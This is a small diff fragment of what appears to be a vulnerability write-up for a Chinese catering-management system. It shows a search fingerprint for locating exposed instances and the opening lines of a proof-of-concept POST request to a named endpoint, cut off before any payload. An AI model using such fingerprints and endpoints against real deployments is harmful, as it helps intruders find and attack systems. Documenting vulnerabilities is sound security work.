@@ -8,7 +8,7 @@
 body="tmp_md5_pwd" || title=="喰星云·数字化餐饮服务系统" || body="请使用谷歌浏览器,点击进入下载地址"
 ```
 
-## poc
+## POC
 ```
 POST /chainsales/mobile/home/check HTTP/1.1
 Host: target.com
